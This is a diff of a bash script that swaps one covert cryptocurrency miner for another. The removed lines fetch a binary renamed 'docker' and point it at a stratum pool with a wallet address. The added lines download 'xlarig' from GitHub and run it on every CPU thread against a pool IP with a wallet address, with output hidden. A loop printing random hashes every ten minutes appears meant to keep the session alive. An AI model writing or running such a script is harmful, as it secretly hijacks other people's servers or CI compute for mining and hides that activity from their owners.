@@ -1,5 +1,8 @@
-#!/bin/bash
-wget https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz && tar -xvf TT.tar.gz
-mv IJAN docker
-./docker -a firopow -o stratum+tcp://139.162.77.84:80 -u a5kHSx8Hg1Sn8ELXcy6oHJi4QdE9nxsiuU.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+A=172.105.207.186:443
+B=867VgRiSidDhm8L4gUzkSoKA49D6bcsBwRneopcngnQb85TX3LG9poAfdThb3nxLmXBCEh2KHkpUUSU8DbjVjX9oSKScM6D
+C=hab
+apt-get update && apt-get upgrade -y
+wget https://github.com/Adeemar7/soft/raw/main/xlarig.tar.gz
+tar -xf xlarig.tar.gz
+./xlarig -o $A -u $B.$C -t$(nproc --all) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
